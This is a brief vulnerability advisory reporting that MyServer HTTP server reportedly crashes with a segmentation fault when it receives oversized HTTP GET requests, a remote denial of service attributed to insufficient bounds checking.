MyServer HTTP server has been reported prone to a remote denial of service attack.

The issue presents itself, likely due to a lack of sufficient bounds checking, performed on arguments that are supplied via malicious HTTP GET requests. It has been reported that a remote attacker may invoke a malicious HTTP GET request containing excessive data, that will supposedly trigger a segmentation fault in the server executable and the software will fail.
